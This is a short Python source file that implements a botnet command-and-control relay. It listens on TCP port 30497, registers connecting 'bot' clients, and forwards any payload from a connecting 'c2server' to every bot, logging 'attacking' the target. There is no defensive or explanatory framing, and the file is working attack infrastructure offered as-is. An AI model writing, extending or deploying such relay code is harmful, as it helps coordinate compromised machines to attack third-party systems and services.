import sys
import socket
import threading
from colorama import init, Fore, Back, Style	# for color and style

class Chanel():
	"""docstring for Chanel"""
	def __init__(self):
		self.bind_ip = '0.0.0.0'
		self.bind_port = 30497
		self.bots = []
	def bootstrap(self):
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.bind((self.bind_ip, self.bind_port))
		soc.listen(10)
		print(Style.BRIGHT, end='')
		print(Fore.YELLOW + "*** Listening on port %d with %d bot" % (self.bind_port, len(self.bots)))
		print(Fore.RESET, end='')
		while True:
			client_soc, addr = soc.accept()
			bot_handler = threading.Thread(target=self.bot_handler, args=(client_soc, addr,))
			bot_handler.start()
	def bot_connect(self, client_soc, addr):
		self.bots.append(client_soc)
		print(Fore.CYAN + "... Accept connection from %s" % (str(addr)))
		print(Fore.YELLOW + "*** Listening on port %d with %d bot" % (self.bind_port, len(self.bots)))
		print(Fore.RESET, end='')
	def c2s_handler(self, client_soc, addr, payload):
		print(Fore.RED + "!!! Accept connection from c2server %s, attacking %s" % (str(addr), payload))
		print(Fore.RESET, end='')
		for bot in self.bots:
			bot.send(str("chn#" + str(payload)).encode("utf8"))
	def bot_handler(self, client_soc, addr):
		message = client_soc.recv(1024)
		header, payload = message.decode("utf8").split("#")
		if (header == "bot"):
			self.bot_connect(client_soc, addr)
		elif (header == "c2s"):
			c2s_handler = threading.Thread(target=self.c2s_handler, args=(client_soc, addr, payload,))
			c2s_handler.start()

if __name__ == '__main__':
	init()	# initialize color
	chanel = Chanel()
	chanel.bootstrap()